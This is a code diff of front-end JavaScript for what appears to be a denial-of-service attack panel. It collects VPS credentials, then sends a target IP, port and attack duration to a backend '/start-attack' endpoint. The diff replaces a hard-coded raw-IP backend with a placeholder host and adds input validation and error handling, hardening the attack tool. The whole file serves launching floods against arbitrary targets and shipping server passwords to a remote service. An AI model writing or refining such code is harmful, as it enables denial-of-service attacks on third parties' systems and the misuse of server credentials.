@@ -4,12 +4,17 @@ document.getElementById('setupVPS').addEventListener('click', function () {
     const password = prompt('Enter VPS Password:');
 
     if (ip && username && password) {
-        fetch('http://45.77.193.174:3000/setup-vps', {
+        fetch('https://your-backend.onrender.com/setup-vps', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ ip, username, password }),
         })
-            .then((response) => response.json())
+            .then((response) => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
             .then((data) => {
                 document.getElementById('vpsStatus').textContent = data.message;
                 document.getElementById('vpsStatus').style.color = '#00ff00';
@@ -29,8 +34,14 @@ document.getElementById('attackButton').addEventListener('click', function () {
     const port = document.getElementById('port').value;
     const duration = document.getElementById('duration').value;
 
+    // Input validation
     if (!ip || !port || !duration) {
         alert('All fields are required!');
+        return;
+    }
+
+    if (isNaN(port) || isNaN(duration)) {
+        alert('Port and duration must be numbers!');
         return;
     }
 
@@ -39,12 +50,17 @@ document.getElementById('attackButton').addEventListener('click', function () {
         return;
     }
 
-    fetch('http://45.77.193.174:3000/start-attack', {
+    fetch('https://your-backend.onrender.com/start-attack', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ ip, port, duration }),
+        body: JSON.stringify({ ip, port: Number(port), duration: Number(duration) }),
     })
-        .then((response) => response.json())
+        .then((response) => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.json();
+        })
         .then((data) => {
             document.getElementById('attackStatus').textContent = data.message;
         })
